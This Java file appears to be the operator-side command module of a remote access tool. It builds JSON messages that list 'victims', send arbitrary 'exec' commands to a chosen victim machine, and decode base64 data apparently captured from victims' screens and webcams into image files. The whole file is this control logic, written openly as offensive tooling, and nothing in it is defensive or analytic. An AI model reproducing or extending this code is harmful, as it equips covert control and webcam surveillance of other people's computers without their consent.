package com.heshanthenura.fennec;

import java.awt.image.BufferedImage;
import java.io.*;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;

import javax.imageio.ImageIO;

public class Commands {

    public String setRole() {
        Map<String, String> response = new HashMap<>();
        response.put("type", "set_role");
        response.put("role", "heshan");

        try {
            ObjectMapper objectMapper = new ObjectMapper();
            return objectMapper.writeValueAsString(response); 
        } catch (Exception e) {
            e.printStackTrace();
            return "{\"status\": \"error\", \"message\": \"Failed to generate JSON\"}";
        }
    }

    public String getVictims(){
        Map<String, String> response = new HashMap<>();
        response.put("type", "info");
        response.put("info_name", "lv");

        try {
            ObjectMapper objectMapper = new ObjectMapper();
            return objectMapper.writeValueAsString(response);
        } catch (Exception e) {
            e.printStackTrace();
            return "{\"status\": \"error\", \"message\": \"Failed to generate JSON\"}";
        }
    }

    public String exec(String client,String victim,String command){
        Map<String, String> response = new HashMap<>();
        response.put("type", "exec");
        response.put("state", "req");
        response.put("client", client);
        response.put("victim", victim);
        response.put("command",command);

        try {
            ObjectMapper objectMapper = new ObjectMapper();
            return objectMapper.writeValueAsString(response);
        } catch (Exception e) {
            e.printStackTrace();
            return "{\"status\": \"error\", \"message\": \"Failed to generate JSON\"}";
        }
    }

    public void decodeImg(String b64) {
        b64 = b64.replaceAll("[^A-Za-z0-9+/=]", "");
        byte[] decodedBytes = Base64.getDecoder().decode(b64);
        try (FileOutputStream fos = new FileOutputStream("decoded_image.png")) {
            fos.write(decodedBytes);
            System.out.println("Image successfully decoded and saved as decoded_image.png");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void decodeCam(String b64) {
        b64 = b64.replaceAll("[^A-Za-z0-9+/=]", "");
        byte[] decodedBytes = Base64.getDecoder().decode(b64);
        try (FileOutputStream fos = new FileOutputStream("decoded_image.bmp")) {
            fos.write(decodedBytes);
            System.out.println("Image successfully decoded and saved as decoded_image.bmp");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
